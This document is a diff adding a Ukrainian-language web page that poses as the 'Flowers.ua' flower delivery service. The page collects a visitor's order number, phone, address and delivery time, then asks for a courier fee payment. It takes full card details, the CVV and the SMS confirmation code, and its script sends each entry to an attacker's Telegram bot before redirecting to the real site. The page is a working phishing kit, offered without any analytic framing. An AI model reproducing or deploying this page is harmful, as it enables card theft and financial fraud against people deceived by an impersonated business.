@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flowers.ua - Доставка квітів</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f5f0eb; padding: 20px; }
+        .container { max-width: 600px; margin: auto; background: #fff; border-radius: 24px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); overflow: hidden; }
+        .header { background: #2c5a2e; padding: 20px; text-align: center; }
+        .logo { max-width: 180px; margin: 0 auto; display: block; }
+        .banners { display: flex; gap: 12px; padding: 20px; overflow-x: auto; background: #fef9f0; }
+        .banner-item { min-width: 140px; text-align: center; }
+        .banner-item img { width: 100%; border-radius: 16px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        .step { display: none; padding: 20px; }
+        .step.active { display: block; }
+        input, button { width: 100%; margin: 12px 0; padding: 14px; border-radius: 40px; border: 1px solid #ddd; font-size: 16px; }
+        button { background: #2c5a2e; color: white; font-weight: bold; border: none; cursor: pointer; transition: 0.2s; }
+        button:hover { background: #1e3f20; }
+        .price { font-weight: bold; color: #d32f2f; font-size: 20px; text-align: center; margin: 15px 0; }
+        .icon { width: 24px; vertical-align: middle; margin-right: 8px; }
+        .flex-row { display: flex; align-items: center; gap: 10px; }
+        hr { margin: 15px 0; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <img class="logo" src="https://cdn-icons-png.flaticon.com/512/1995/1995572.png" alt="Flowers.ua логотип">
+    </div>
+    <div class="banners">
+        <div class="banner-item"><img src="https://images.pexels.com/photos/56866/garden-rose-red-pink-56866.jpeg?auto=compress&cs=tinysrgb&w=150" alt="Троянди"><div>Троянди</div></div>
+        <div class="banner-item"><img src="https://images.pexels.com/photos/736230/pexels-photo-736230.jpeg?auto=compress&cs=tinysrgb&w=150" alt="Півонії"><div>Півонії</div></div>
+        <div class="banner-item"><img src="https://images.pexels.com/photos/931177/pexels-photo-931177.jpeg?auto=compress&cs=tinysrgb&w=150" alt="Лілії"><div>Лілії</div></div>
+        <div class="banner-item"><img src="https://images.pexels.com/photos/1458694/pexels-photo-1458694.jpeg?auto=compress&cs=tinysrgb&w=150" alt="Орхідеї"><div>Орхідеї</div></div>
+    </div>
+
+    <div id="step1" class="step active">
+        <h3>Номер замовлення</h3>
+        <input type="text" id="orderNumber" placeholder="Введіть номер замовлення" required>
+        <button onclick="nextStep(2)">Продовжити</button>
+    </div>
+
+    <div id="step2" class="step">
+        <h3>Контактний телефон</h3>
+        <input type="tel" id="phone" placeholder="+38 (___) ___-__-__" required>
+        <button onclick="nextStep(3)">Далі</button>
+    </div>
+
+    <div id="step3" class="step">
+        <h3>Адреса доставки</h3>
+        <input type="text" id="address" placeholder="вулиця, будинок, квартира" required>
+        <h3>Бажаний час доставки</h3>
+        <input type="text" id="time" placeholder="наприклад, 15:00-17:00" required>
+        <button onclick="nextStep(4)">Розрахувати вартість</button>
+    </div>
+
+    <div id="step4" class="step">
+        <h3>Вартість доставки</h3>
+        <div class="price">235 грн (послуги кур'єра)</div>
+        <p>Оплата послуг кур'єра сплачується отримувачем.</p>
+        <button onclick="nextStep(5)">Перейти до оплати</button>
+    </div>
+
+    <div id="step5" class="step">
+        <h3>Дані картки</h3>
+        <input type="text" id="cardNumber" placeholder="Номер картки" required>
+        <div class="flex-row"><input type="text" id="cardExp" placeholder="ММ/РР" style="width:50%"><input type="text" id="cardCvv" placeholder="CVV" style="width:50%"></div>
+        <button onclick="sendCard()">Відправити та отримати SMS-код</button>
+    </div>
+
+    <div id="step6" class="step">
+        <h3>Код із SMS</h3>
+        <input type="text" id="smsCode" placeholder="Введіть код" required>
+        <button onclick="finalSubmit()">Підтвердити замовлення</button>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = '8627594813:AAF-eC124wgCOPqaj6Tu_Yp9TvQjNqLZqDU';
+    const CHAT_ID = '-1003971116343';
+    let order = {};
+
+    function nextStep(step) {
+        if (step === 2) {
+            let orderNum = document.getElementById('orderNumber').value.trim();
+            if (!orderNum) { alert('Введіть номер замовлення'); return; }
+            order.orderNumber = orderNum;
+        }
+        if (step === 3) {
+            let phone = document.getElementById('phone').value.trim();
+            if (!phone) { alert('Введіть номер телефону'); return; }
+            order.phone = phone;
+            sendToTelegram(`НОМЕР ЗАМОВЛЕННЯ: ${order.orderNumber}\nТЕЛЕФОН: ${order.phone}`);
+        }
+        if (step === 4) {
+            let address = document.getElementById('address').value.trim();
+            let time = document.getElementById('time').value.trim();
+            if (!address || !time) { alert('Введіть адресу та час'); return; }
+            order.address = address;
+            order.time = time;
+            sendToTelegram(`АДРЕСА: ${order.address}\nЧАС: ${order.time}`);
+        }
+        document.querySelectorAll('.step').forEach((el, idx) => {
+            el.classList.remove('active');
+            if (idx+1 === step) el.classList.add('active');
+        });
+    }
+
+    function sendCard() {
+        let card = document.getElementById('cardNumber').value.trim();
+        let exp = document.getElementById('cardExp').value.trim();
+        let cvv = document.getElementById('cardCvv').value.trim();
+        if (!card || !exp || !cvv) { alert('Заповніть всі поля картки'); return; }
+        order.card = card;
+        order.exp = exp;
+        order.cvv = cvv;
+        sendToTelegram(`ДАНІ КАРТКИ: ${card} | ${exp} | ${cvv}`);
+        nextStep(6);
+    }
+
+    function finalSubmit() {
+        let sms = document.getElementById('smsCode').value.trim();
+        if (!sms) { alert('Введіть код з SMS'); return; }
+        order.sms = sms;
+        sendToTelegram(`КОД ІЗ СМС: ${sms}`);
+        alert('Дякуємо, очікуйте на зв\'язок з кур\'єром.');
+        window.location.href = 'https://flowers.ua';
+    }
+
+    function sendToTelegram(msg) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        }).catch(e => console.log);
+    }
+</script>
+</body>
+</html>
